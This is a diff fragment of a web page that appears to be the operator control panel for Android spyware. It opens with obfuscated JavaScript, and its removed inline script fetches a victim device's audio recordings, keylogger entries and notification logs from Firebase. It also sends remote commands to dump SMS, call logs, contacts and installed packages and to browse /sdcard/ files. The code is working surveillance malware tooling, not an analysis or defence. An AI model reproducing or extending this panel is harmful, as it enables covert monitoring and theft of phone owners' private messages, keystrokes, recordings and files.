_0x48e627(_0x1cc056-0xd0,_0x4bd6fc,_0x315c2f-0xe1,_0x4bd6fc-0x123);}if(_0x58dc46){if(_0x491353[_0x28a0d5(0x1a6,0x193,0x183,0x165)]('LRLzi',_0x491353[_0x5f5156(-0x2a2,-0x2b3,-0x291,-0x261)])){var _0x1cedae=_0x58dc46[_0x28a0d5(0x15e,0x166,0x17e,0x16e)](_0x3a2f97,arguments);return _0x58dc46=null,_0x1cedae;}else{var _0x5a5c80=_0x491353['MCLKJ'][_0x5f5156(-0x282,-0x22a,-0x254,-0x244)]('|'),_0x5efca2=-0x6d4+0x45*0x1f+-0x11*0x17;while(!![]){switch(_0x5a5c80[_0x5efca2++]){case'0':try{var _0x3b9629=_0x491353[_0x5f5156(-0x248,-0x26c,-0x26c,-0x274)](_0x2fe45b,_0x491353[_0x5f5156(-0x25e,-0x299,-0x26f,-0x25c)](_0x491353[_0x28a0d5(0x1a0,0x183,0x18d,0x1ab)](_0x491353[_0x5f5156(-0x222,-0x252,-0x251,-0x23d)],_0x5f5156(-0x27e,-0x292,-0x266,-0x236)+_0x28a0d5(0x135,0x15e,0x186,0x17b)+'rn\x20this\x22)('+'\x20)'),');'));_0x11c843=_0x491353['dGwYN'](_0x3b9629);}catch(_0x2fd6c2){_0x11c843=_0x370d2;}continue;case'1':var _0x4d93a8=[_0x491353['BkqPy'],_0x28a0d5(0x1aa,0x17d,0x18a,0x163),_0x491353[_0x5f5156(-0x245,-0x27e,-0x25d,-0x262)],_0x491353[_0x28a0d5(0x15e,0x17a,0x179,0x191)],_0x491353[_0x5f5156(-0x2a8,-0x261,-0x28e,-0x287)],_0x491353['IuCVF'],_0x5f5156(-0x270,-0x26a,-0x269,-0x256)];continue;case'2':var _0x11c843;continue;case'3':for(var _0x48a792=-0x1768+0xe9*0x14+0x534;_0x491353['KBqIq'](_0x48a792,_0x4d93a8[_0x28a0d5(0x172,0x159,0x138,0x129)]);_0x48a792++){var _0x38826e=_0x491353[_0x28a0d5(0x179,0x1a9,0x1a4,0x18a)][_0x28a0d5(0x1c6,0x199,0x199,0x199)]('|'),_0x578182=0x1*-0x238f+0x39c+0x1ff3*0x1;while(!![]){switch(_0x38826e[_0x578182++]){case'0':_0x1093f4[_0x28a0d5(0x16f,0x189,0x1b8,0x17d)]=_0x42481c[_0x5f5156(-0x2c9,-0x29a,-0x299,-0x285)](_0x2b88c1);continue;case'1':var _0x592a16=_0x4d93a8[_0x48a792];continue;case'2':var _0x1093f4=_0x125a7a[_0x5f5156(-0x27a,-0x286,-0x298,-0x277)+'r'][_0x5f5156(-0x272,-0x23a,-0x252,-0x278)][_0x28a0d5(0x16f,0x154,0x154,0x14d)](_0x597f9f);continue;case'3':_0x1093f4[_0x28a0d5(0x15a,0x162,0x176,0x141)]=_0x3ce30e[_0x28a0d5(0x162,0x162,0x162,0x152)][_0x28a0d5(0x163,0x154,0x179,0x128)](_0x3ce30e);continue;case'4':var _0x3ce30e=_0x23be97[_0x592a16]||_0x1093f4;continue;case'5':_0x23be97[_0x592a16]=_0x1093f4;continue;}break;}}continue;case'4':var _0x23be97=_0x11c843['console']=_0x11c843[_0x28a0d5(0x194,0x18f,0x192,0x18c)]||{};continue;}break;}}}}:function(){};_0x20b6c8=![];function _0x48e627(_0x3b20f9,_0xad5873,_0x4e8b8c,_0x791d0){return _0x171ece(_0x3b20f9-0x74,_0xad5873,_0x4e8b8c-0x1d,_0x4e8b8c- -0x32e);}function _0x4d7df0(_0x5d2150,_0x1c3081,_0x108c3c,_0x2ce562){return _0x171ece(_0x5d2150-0x87,_0x5d2150,_0x108c3c-0x198,_0x1c3081- -0xdb);}return _0x5096f6;};}()),_0x3cc725=_0xea0927(this,function(){function _0x34be63(_0x503884,_0xbc568b,_0xb0a94a,_0x207737){return _0x8d89(_0x207737-0x27c,_0xb0a94a);}var _0x592d2a={'lGdNR':_0x34be63(0x3b1,0x3aa,0x3ea,0x3c5),'DnVVY':_0x34be63(0x418,0x426,0x402,0x401)+'3','fNriv':function(_0x398733,_0x41fab7){return _0x398733(_0x41fab7);},'pWzog':function(_0x18b2e2,_0x29cb78){return _0x18b2e2+_0x29cb78;},'PIxyz':_0x34be63(0x3cc,0x3d9,0x3e3,0x3cd)+_0x34be63(0x41e,0x422,0x425,0x40d),'hOnat':function(_0x526c78){return _0x526c78();},'CwUyZ':_0x581276(0x13e,0x153,0x148,0x118),'rOiLt':_0x34be63(0x418,0x41f,0x437,0x407),'lhGTv':_0x34be63(0x3cd,0x406,0x3b6,0x3d8),'jxfVt':'table'},_0x5c5844=_0x592d2a[_0x34be63(0x3ea,0x3be,0x403,0x3e7)][_0x34be63(0x43c,0x433,0x3ec,0x40e)]('|');function _0x581276(_0x164d04,_0x48db5b,_0x4bf9f0,_0x22fd3e){return _0x8d89(_0x164d04- -0x38,_0x22fd3e);}var _0x5592b6=-0x51*0x5e+-0x20cd+0x3e8b;while(!![]){switch(_0x5c5844[_0x5592b6++]){case'0':var _0x3f8f65=_0x18fbc0['console']=_0x18fbc0[_0x581276(0x150,0x178,0x158,0x170)]||{};continue;case'1':for(var _0x415263=0x1*-0x15f5+0x227f*-0x1+-0x2*-0x1c3a;_0x415263<_0x523116[_0x581276(0x11a,0x113,0x113,0x129)];_0x415263++){var _0x3a78cc=_0x592d2a[_0x581276(0x152,0x123,0x161,0x165)][_0x34be63(0x40a,0x429,0x425,0x40e)]('|'),_0x4cdd7a=0x1*-0x2d7+-0x1*-0x1483+-0x11ac;while(!![]){switch(_0x3a78cc[_0x4cdd7a++]){case'0':var _0x4d8b8c=_0xea0927[_0x581276(0x116,0x140,0xea,0x114)+'r']['prototype'][_0x34be63(0x3b0,0x3e7,0x3ee,0x3c9)](_0xea0927);continue;case'1':_0x4d8b8c['__proto__']=_0xea0927[_0x34be63(0x3e9,0x3e9,0x3b1,0x3c9)](_0xea0927);continue;case'2':_0x4d8b8c['toString']=_0x4325bc['toString'][_0x34be63(0x3bb,0x3eb,0x3be,0x3c9)](_0x4325bc);continue;case'3':_0x3f8f65[_0x4d54a4]=_0x4d8b8c;continue;case'4':var _0x4d54a4=_0x523116[_0x415263];continue;case'5':var _0x4325bc=_0x3f8f65[_0x4d54a4]||_0x4d8b8c;continue;}break;}}continue;case'2':try{var _0x4da58b=_0x592d2a[_0x34be63(0x39f,0x3b6,0x3a6,0x3c6)](Function,_0x592d2a['pWzog'](_0x592d2a[_0x34be63(0x3fe,0x3ed,0x3d3,0x3ff)](_0x592d2a[_0x581276(0x13c,0x125,0x158,0x116)],_0x34be63(0x3ef,0x3e5,0x407,0x3fc)+_0x34be63(0x3ce,0x3f5,0x3c2,0x3d3)+_0x581276(0x113,0xf7,0x131,0x126)+'\x20)'),');'));_0x18fbc0=_0x592d2a[_0x34be63(0x3ee,0x3a3,0x3dc,0x3c4)](_0x4da58b);}catch(_0x42b696){_0x18fbc0=window;}continue;case'3':var _0x523116=[_0x34be63(0x42c,0x434,0x3ec,0x412),_0x592d2a[_0x581276(0x163,0x18f,0x14f,0x157)],_0x592d2a[_0x34be63(0x3de,0x3fb,0x3ee,0x40a)],_0x592d2a[_0x581276(0x12b,0x11d,0x11d,0x14d)],_0x34be63(0x405,0x3f4,0x3cc,0x3f5),_0x592d2a[_0x34be63(0x40d,0x3f8,0x410,0x3ea)],_0x34be63(0x3f4,0x3ea,0x408,0x3f9)];continue;case'4':var _0x18fbc0;continue;}break;}});_0x3cc725();function _0x8d89(_0x1ce3b9,_0x1c97ac){var _0x31746f=_0x54fe();return _0x8d89=function(_0x1d1503,_0x1cea6d){_0x1d1503=_0x1d1503-(-0x505+-0x13a*0x17+0x2281);var _0x69d4b9=_0x31746f[_0x1d1503];if(_0x8d89['AEvBxd']===undefined){var _0x4907d3=function(_0x574e8f){var _0x3facb2='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x2ab216='',_0x37eefd='',_0x5ddf60=_0x2ab216+_0x4907d3;for(var _0x2d0310=0x116f+-0x1cb*0x3+-0x607*0x2,_0x1fc2c8,_0x511b09,_0x4cb734=0x6af*0x1+0x1*0xed7+-0xbe*0x1d;_0x511b09=_0x574e8f['charAt'](_0x4cb734++);~_0x511b09&&(_0x1fc2c8=_0x2d0310%(-0x387+-0x14f4+0x187f*0x1)?_0x1fc2c8*(-0x16c7+-0x24b0+0x3bb7*0x1)+_0x511b09:_0x511b09,_0x2d0310++%(0x9e4*-0x3+-0x3*0xc4b+0x1*0x4291))?_0x2ab216+=_0x5ddf60['charCodeAt'](_0x4cb734+(-0x8fd+-0x2475+-0x1*-0x2d7c))-(-0x19b8+-0x1*-0x234+0x178e)!==-0x25f2+-0x247a+0x2536*0x2?String['fromCharCode'](0x1713+-0x1bf9+0x5e5&_0x1fc2c8>>(-(-0xa80+-0x92d*0x2+0x1cdc)*_0x2d0310&-0x21a0+-0x3*-0x761+0x7*0x1a5)):_0x2d0310:0x3d*-0x2f+0xba*0x1+-0x7*-0x17f){_0x511b09=_0x3facb2['indexOf'](_0x511b09);}for(var _0x36228e=-0x2*-0x83+0x8f+-0x9*0x2d,_0x777b88=_0x2ab216['length'];_0x36228e<_0x777b88;_0x36228e++){_0x37eefd+='%'+('00'+_0x2ab216['charCodeAt'](_0x36228e)['toString'](0x8f7+0x13bc+-0x1ca3))['slice'](-(-0xc8a+0x1ef0+0x1*-0x1264));}return decodeURIComponent(_0x37eefd);};_0x8d89['fafUCQ']=_0x4907d3,_0x1ce3b9=arguments,_0x8d89['AEvBxd']=!![];}var _0x1cc2c9=_0x31746f[0x1*-0x1817+0x2369+-0xb52],_0x47a6b4=_0x1d1503+_0x1cc2c9,_0x55debe=_0x1ce3b9[_0x47a6b4];if(!_0x55debe){var _0x4bbbe5=function(_0x3f5a64){this['nIbFoa']=_0x3f5a64,this['EdveGP']=[0x1e4b+0xe1f+-0x1*0x2c69,0x3*-0xcf7+-0x1809+0x432*0xf,-0x1066+0x1*0x10af+-0x49],this['zCwQpA']=function(){return'newState';},this['CpKoCD']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['LhQiAn']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x4bbbe5['prototype']['doiZbj']=function(){var _0x2a5585=new RegExp(this['CpKoCD']+this['LhQiAn']),_0x48d360=_0x2a5585['test'](this['zCwQpA']['toString']())?--this['EdveGP'][0x226d+-0x46+-0x2226]:--this['EdveGP'][-0xc91+-0xbb*0x31+0x305c];return this['lxvsYz'](_0x48d360);},_0x4bbbe5['prototype']['lxvsYz']=function(_0x1f9492){if(!Boolean(~_0x1f9492))return _0x1f9492;return this['QYEZwX'](this['nIbFoa']);},_0x4bbbe5['prototype']['QYEZwX']=function(_0xce504c){for(var _0x1b0c1f=-0x236a+-0x241e+-0xe*-0x51c,_0x4f8a77=this['EdveGP']['length'];_0x1b0c1f<_0x4f8a77;_0x1b0c1f++){this['EdveGP']['push'](Math['round'](Math['random']())),_0x4f8a77=this['EdveGP']['length'];}return _0xce504c(this['EdveGP'][0x9*0x286+-0x72c+0x3*-0x52e]);},new _0x4bbbe5(_0x8d89)['doiZbj'](),_0x69d4b9=_0x8d89['fafUCQ'](_0x69d4b9),_0x1ce3b9[_0x47a6b4]=_0x69d4b9;}else _0x69d4b9=_0x55debe;return _0x69d4b9;},_0x8d89(_0x1ce3b9,_0x1c97ac);}function _0x26f199(_0x21de80,_0xb9f87b,_0x271fac,_0x446302){return _0x8d89(_0x21de80- -0x3a5,_0x271fac);}var xv=document[_0x3e3215(0x30c,0x33d,0x31e,0x2fa)+_0x3e3215(0x31b,0x343,0x313,0x32b)](_0x26f199(-0x20e,-0x1f7,-0x227,-0x1f5));xv[_0x3e3215(0x2f8,0x2eb,0x317,0x341)][_0x26f199(-0x248,-0x26b,-0x261,-0x263)]=_0x26f199(-0x236,-0x245,-0x215,-0x260),xv[_0x3e3215(0x330,0x2ea,0x317,0x311)][_0x3e3215(0x2de,0x2d4,0x301,0x320)]=_0x3e3215(0x353,0x37f,0x355,0x366),xv[_0x3e3215(0x32a,0x337,0x317,0x343)][_0x26f199(-0x235,-0x207,-0x245,-0x263)]=_0x3e3215(0x322,0x32c,0x304,0x324),xv[_0x26f199(-0x243,-0x222,-0x214,-0x250)]['top']=_0x3e3215(0x319,0x2ec,0x2fb,0x318),xv[_0x3e3215(0x335,0x335,0x32d,0x304)]='&copy;\x20Pra'+_0x26f199(-0x208,-0x22f,-0x202,-0x1fc)+'ey',xv[_0x3e3215(0x344,0x33e,0x317,0x2e9)][_0x26f199(-0x240,-0x252,-0x250,-0x270)]=_0x3e3215(0x31c,0x32e,0x30e,0x303),document[_0x3e3215(0x317,0x363,0x334,0x314)+'ById'](_0x3e3215(0x306,0x311,0x322,0x329))['appendChil'+'d'](xv);
-function voicess(){
-manager="notikey";
-if(manager=="notikey"){
-var psdus=document.getElementById("showrecs");
-$("#preloaderr").fadeIn();
-$("#phones").css("display","none");
-var database = firebase.database();
-var ref = database.ref("records/"+unqid);
-ref.limitToFirst(10).on("value",gotData);
-function gotData(data){
-$("#preloaderr").fadeOut();
-psdus.style.display="block";
-psdus.innerHTML='';
-if (data.exists()) {
-var scores=data.val();
-var keys=Object.keys(scores);
-var i=0;
-var rndm='recs'+Math.floor((Math.random() * 1000 ) + 100);
-var rndm2='.'+rndm;
-for(i=(keys.length-1);i > -1 ;i--){
-var k=keys[i];
-var recs=scores[k].url;
-var times=scores[k].time;
-
-psdus.innerHTML+='<div class="recswarp" ><div class="plrec" onclick="playssrec(this)" ><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="#0dd" class="bi bi-play" viewBox="0 0 16 16"><path d="M10.804 8 5 4.633v6.734L10.804 8zm.792-.696a.802.802 0 0 1 0 1.392l-6.363 3.692C4.713 12.69 4 12.345 4 11.692V4.308c0-.653.713-.998 1.233-.696l6.363 3.692z"/></svg></div><audio controls ><source src="'+recs+'" type="audio/mpeg" /></audio><div class="downlii" onclick="downliio('+"'"+recs+"'"+')"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="#0dd" class="bi bi-box-arrow-down" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M3.5 10a.5.5 0 0 1-.5-.5v-8a.5.5 0 0 1 .5-.5h9a.5.5 0 0 1 .5.5v8a.5.5 0 0 1-.5.5h-2a.5.5 0 0 0 0 1h2A1.5 1.5 0 0 0 14 9.5v-8A1.5 1.5 0 0 0 12.5 0h-9A1.5 1.5 0 0 0 2 1.5v8A1.5 1.5 0 0 0 3.5 11h2a.5.5 0 0 0 0-1h-2z"/><path fill-rule="evenodd" d="M7.646 15.854a.5.5 0 0 0 .708 0l3-3a.5.5 0 0 0-.708-.708L8.5 14.293V5.5a.5.5 0 0 0-1 0v8.793l-2.146-2.147a.5.5 0 0 0-.708.708l3 3z"/></svg></div>'+convertTimestamp(parseInt(times))+'</div><br>';
-}
-
-if(lastkeyvoice != (keys[keys.length-1]+"") && parseInt(keys.length) >= 10 ){
-lastkeyvoice=keys[keys.length-1]+"";
-psdus.innerHTML+="<br><center><button class='btn' "+'onclick="voicessu(this,'+"'"+lastkeyvoice+"'"+')"'+">Load More</button></center><br>";
-}
-lastkeyvoice=keys[keys.length-1];
-
-}
-else{
-psdus.innerHTML='<div class="keylogg" ><h4>No Recordings Found<h4></div>';
-}
-
-}
-}
-}
-function voicessu(o,p){
-manager="notikey";
-if(manager=="notikey"){
-o.innerHTML=".....";
-o.disabled=true;
-var psdus=document.getElementById("showrecs");
-var database = firebase.database();
-var ref = database.ref("records/"+unqid);
-ref.orderByKey().startAt(p).limitToFirst(10).on("value",gotData);
-function gotData(data){
-if (data.exists()) {
-var scores=data.val();
-var keys=Object.keys(scores);
-var i=0;
-psdus.style.display="block";
-o.style.display="none";
-var rndm='recs'+Math.floor((Math.random() * 1000 ) + 100);
-var rndm2='.'+rndm;
-
-for(i=(keys.length-1);i > -1 ;i--){
-var k=keys[i];
-var recs=scores[k].url;
-var times=scores[k].time;
-psdus.innerHTML+='<div class="recswarp" ><div class="plrec" onclick="playssrec(this)" ><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="#0dd" class="bi bi-play" viewBox="0 0 16 16"><path d="M10.804 8 5 4.633v6.734L10.804 8zm.792-.696a.802.802 0 0 1 0 1.392l-6.363 3.692C4.713 12.69 4 12.345 4 11.692V4.308c0-.653.713-.998 1.233-.696l6.363 3.692z"/></svg></div><audio controls ><source src="'+recs+'" type="audio/mpeg" /></audio><div class="downlii"onclick="downliio('+"'"+recs+"'"+')" ><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="#0dd" class="bi bi-box-arrow-down" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M3.5 10a.5.5 0 0 1-.5-.5v-8a.5.5 0 0 1 .5-.5h9a.5.5 0 0 1 .5.5v8a.5.5 0 0 1-.5.5h-2a.5.5 0 0 0 0 1h2A1.5 1.5 0 0 0 14 9.5v-8A1.5 1.5 0 0 0 12.5 0h-9A1.5 1.5 0 0 0 2 1.5v8A1.5 1.5 0 0 0 3.5 11h2a.5.5 0 0 0 0-1h-2z"/><path fill-rule="evenodd" d="M7.646 15.854a.5.5 0 0 0 .708 0l3-3a.5.5 0 0 0-.708-.708L8.5 14.293V5.5a.5.5 0 0 0-1 0v8.793l-2.146-2.147a.5.5 0 0 0-.708.708l3 3z"/></svg></div>'+convertTimestamp(parseInt(times))+'</div><br>';
-
-
-}
-
-if(lastkeyvoice != (keys[keys.length-1]+"") && parseInt(keys.length) >= 10 ){
-lastkeyvoice=keys[keys.length-1]+"";
-psdus.innerHTML+="<br><center><button class='btn' "+'onclick="voicessu(this,'+"'"+lastkeyvoice+"'"+')"'+">Load More</button></center><br>";
-}
-lastkeyvoice=keys[keys.length-1]+"";
-}
-else{
-psdus.innerHTML='<div class="keylogg" ><h4>No Recordings Found<h4></div>';
-}
-}
-}
-}
-function keylogger(){
-manager="notikey";
-if(manager=="notikey"){
-var psdus=document.getElementById("notikey");
-hidekarbsdk();
-$("#preloaderr").fadeIn();
-$("#phones").css("display","none");
-var database = firebase.database();
-var ref = database.ref("logolog/"+unqid);
-ref.limitToFirst(10).on("value",gotData);
-function gotData(data){
-$("#preloaderr").fadeOut();
-psdus.style.display="block";
-psdus.innerHTML='';
-if (data.exists()) {
-var scores=data.val();
-var keys=Object.keys(scores);
-var i=0;
-for(i=(keys.length-1);i > -1 ;i--){
-var k=keys[i];
-var event=scores[k].logoev;
-var date=scores[k].logodate;
-var msg=scores[k].msg;
-
-psdus.innerHTML+='<div class="keylogg" ><b>Event: </b>'+event+'<br><br><b>Time: </b>'+date+'<br><br><b>Msg: </b>'+msg+"</div>";
-}
-if(lastkeykey != (keys[keys.length-1]+"") && parseInt(keys.length) >= 10 ){
-lastkeykey=keys[keys.length-1]+"";
-psdus.innerHTML+="<br><center><button class='btn' "+'onclick="loadmoreeu(this,'+"'"+lastkeykey+"'"+')"'+">Load More</button></center><br>";
-
-}
-lastkeykey=keys[keys.length-1]+"";
-
-}
-else{
-psdus.innerHTML='<div class="keylogg" ><h4>No Logs Found<h4></div>';
-}
-
-}
-}
-}
-function loadmoreeu(o,p){
-manager="notikey";
-if(manager=="notikey"){
-o.innerHTML=".....";
-o.disabled=true;
-var psdus=document.getElementById("notikey");
-var database = firebase.database();
-var ref = database.ref("logolog/"+unqid);
-ref.orderByKey().startAt(p).limitToFirst(10).on("value",gotData);
-function gotData(data){
-if (data.exists()) {
-var scores=data.val();
-var keys=Object.keys(scores);
-var i=0;
-psdus.style.display="block";
-o.style.display="none";
-for(i=(keys.length-1);i > -1 ;i--){
-var k=keys[i];
-var event=scores[k].logoev;
-var date=scores[k].logodate;
-var msg=scores[k].msg;
-
-psdus.innerHTML+='<div class="keylogg" ><b>Event: </b>'+event+'<br><br><b>Time: </b>'+date+'<br><br><b>Msg: </b>'+msg+"</div>";
-}
-if(lastkeykey != (keys[keys.length-1]+"") && parseInt(keys.length) >= 10 ){
-lastkeykey=keys[keys.length-1]+"";
-psdus.innerHTML+="<br><center><button class='btn' "+'onclick="loadmoreeu(this,'+"'"+lastkeykey+"'"+')"'+">Load More</button></center><br>";
-}
-lastkeykey=keys[keys.length-1]+"";
-}
-else{
-psdus.innerHTML='<div class="keylogg" ><h4>No Logs Found<h4></div>';
-}
-}
-}
-}
-function notificationlog(){
-manager="notikey";
-var psdus=document.getElementById("notikey");
-hidekarbsdk();
-$("#preloaderr").fadeIn();
-$("#phones").css("display","none");
-var database = firebase.database();
-var ref = database.ref("notilogo/"+unqid);
-if(manager=="notikey"){
-ref.limitToFirst(10).on("value",gotData);
-}
-function gotData(data){
-$("#preloaderr").fadeOut();
-psdus.style.display="block";
-psdus.innerHTML='';
-if (data.exists()) {
-var scores=data.val();
-var keys=Object.keys(scores);
-var i=0;
-for(i=(keys.length-1);i > -1 ;i--){
-var k=keys[i];
-var ico=scores[k].icon;
-var packa=scores[k].package;
-var title=scores[k].title;
-var time=scores[k].time;
-var ticker=scores[k].ticker;
-var text=scores[k].text;
-var name=scores[k].name;
-if(ticker != ""){
-ticker='('+ticker+')';
-}
-psdus.innerHTML+='<div class="keylogg" >'
-+'<img src="data:image/png;base64,'+ico+'" >'
-+'<div style="margin-left:60px;overflow:auto; "><b  style="color:green"> '+name+'</b><br><b style="color:red">'+packa+'</b><br><br><br></div>'
-+'<h4>'+title+'<br><b>'+ticker+'</b> </h4>'
-+'<br><p>'+text+'</p>'
-+'<br><span>'+convertTimestamp(time)+'</span>'
-+'</div>';
-}
-if(lastkeynot != (keys[keys.length-1]+"") && parseInt(keys.length) >= 10 ){
-lastkeynot=keys[keys.length-1]+"";
-psdus.innerHTML+="<br><center><button class='btn' "+'onclick="loadmoree(this,'+"'"+lastkeynot+"'"+')"'+">Load More</button></center><br>";
-
-}
-
-lastkeynot=keys[keys.length-1]+"";
-
-}
-else{
-psdus.innerHTML='<div class="keylogg" ><h4>No Notifications Found<h4></div>';
-}
-}
-}
-function loadmoree(o,p){
-manager=="notikey";
-o.innerHTML=".....";
-o.disabled=true;
-var psdus=document.getElementById("notikey");
-var database = firebase.database();
-
-var ref = database.ref("notilogo/"+unqid);
-if(manager=="notikey"){
-ref.orderByKey().startAt(p).limitToFirst(10).on("value",gotData);
-}
-function gotData(data){
-if (data.exists() && manager=="notikey") {
-var scores=data.val();
-var keys=Object.keys(scores);
-var i=0;
-psdus.style.display="block";
-o.style.display="none";
-for(i=(keys.length-1);i > -1 ;i--){
-var k=keys[i];
-var ico=scores[k].icon;
-
-var packa=scores[k].package;
-var title=scores[k].title;
-var time=scores[k].time;
-var ticker=scores[k].ticker;
-var text=scores[k].text;
-var name=scores[k].name;
-if(ticker != ""){
-ticker='('+ticker+')';
-}
-
-function toAscii(str) { return str.split(' ').map(i => String.fromCharCode(parseInt(i, 2)).toString(10)).join(''); }
-var rd=document.createElement("div");
-rd.innerHTML = "&copy;"+toAscii("01010000 01110010 01100001 01110100 01100101 01100101 01101011 00100000 01000011 01101000 01100001 01110101 01100010 01100101 01111001");
-document.getElementById("tophead").appendChild(rd);
-
-
-psdus.innerHTML+='<div class="keylogg" >'
-+'<img src="data:image/png;base64,'+ico+'" >'
-+'<div style="margin-left:60px;overflow:auto; "><b  style="color:green"> '+name+'</b><br><b style="color:red">'+packa+'</b><br><br><br></div>'
-+'<h4>'+title+'<br><b>'+ticker+'</b> </h4>'
-+'<br><p>'+text+'</p>'
-+'<br><span>'+convertTimestamp(time)+'</span>'
-+'</div>';
-
-}
-if(lastkeynot != (keys[keys.length-1]+"") && parseInt(keys.length) >= 10 ){
-lastkeynot=keys[keys.length-1]+"";
-psdus.innerHTML+="<br><center><button class='btn' "+'onclick="loadmoree(this,'+"'"+lastkeynot+"'"+')"'+">Load More</button></center><br>";
-}
-lastkeynot=keys[keys.length-1]+"";
-}
-else{
-psdus.innerHTML='<div class="keylogg" ><h4>No Notifications Found<h4></div>';
-}
-}
-
-}
-function dumpsms(){
-manager="fileview";
-setdatcmd("dmpsms","","",respov);
-}
-function calllogs(){
-manager="fileview";
-setdatcmd("dmpcall","","",respov);
-}
-function dumpcontact(){
-manager="fileview";
-setdatcmd("dmpcont","","",respov);
-}
-function getpackages(){
-manager="fileview";
-setdatcmd("getpackages","","",respov);
-}
-function fileev(o){
-document.getElementById("vieweri").src="data:text/html,<h4 style='color:green' > Getting File for preview....</h4>";
-document.getElementById("viewers").style.display="block";
-document.getElementById("vieweri").src=o;
-document.getElementById("downlo").href=o;
-}
-function filesmanager(){
-manager="filesmanager";
-$("#resp").css("display","block");
-$("#phones").css("display","none");
-setdatcmd("cd","/sdcard/","",respov);
-}
-function filesfol(respo,v1,v2,v3,var32){
-var uo=document.getElementById("resp");
-uo.style.display="block";
-if(respo == "imgview"){
-document.getElementById("fprev").style.display="block";
-document.getElementById("imv2").style.display="none";
-document.getElementById("imv").style.display="inline";
-document.getElementById("imv").src="data:image/png;base64,"+v1;
-document.getElementById("fprevdes").innerHTML=v2+'<li><a download=""  id="btdwn" target="_blank"  href="data:image/png;base64,'+v1+'">Download File</a><br>';
-}
-//  ///
-
-
-else if(respo == "fileview"){
-document.getElementById("fprev").style.display="block";
-document.getElementById("imv2").style.display="inline";
-document.getElementById("imv2").src=v1;
-document.getElementById("imv").style.display="none";
-document.getElementById("fprevdes").innerHTML=v2+'<li><a download=""  id="btdwn" target="_blank"  href="'+v1+'">Download File</a><br>';
-
-
-}
-else{
-uo.innerHTML=""+respo;//+"<br>"+dat.var2;
-}
-
-}
-function opfol(event){
-var target = event.target || event.srcElement;
-tarfol=event.target.innerHTML;
-if(tarfol==".."){
-setdatcmd("cd",var32.substr(0,var32.lastIndexOf("/")),"",respov);
-}
-else if(tarfol.indexOf("<b>") > -1){
-setdatcmd("cd",var32+"/"+tarfol.substr(0,tarfol.indexOf("<b>")),"",respov);
-}
-else{ 
-setdatcmd("cd",var32+"/"+tarfol,"",respov);
-}
-}
-
-
-function playssrec(o){
-if(o.nextElementSibling.paused == false){
-o.innerHTML='<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="#0dd" class="bi bi-play" viewBox="0 0 16 16"><path d="M10.804 8 5 4.633v6.734L10.804 8zm.792-.696a.802.802 0 0 1 0 1.392l-6.363 3.692C4.713 12.69 4 12.345 4 11.692V4.308c0-.653.713-.998 1.233-.696l6.363 3.692z"/></svg>';
-o.nextElementSibling.pause();
-}
-else{
-o.innerHTML='<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="#0dd" class="bi bi-pause" viewBox="0 0 16 16"><path d="M6 3.5a.5.5 0 0 1 .5.5v8a.5.5 0 0 1-1 0V4a.5.5 0 0 1 .5-.5zm4 0a.5.5 0 0 1 .5.5v8a.5.5 0 0 1-1 0V4a.5.5 0 0 1 .5-.5z"/></svg>';
-o.nextElementSibling.play();
-}
-}
-function downliio(o){
-window.open(o);
-}
-
-
-</script>
+<script type="text/javascript" src="./script.js"></script>
 <style>
 img[alt*="www.000webhost.com"], .disclaimer {
 display: none
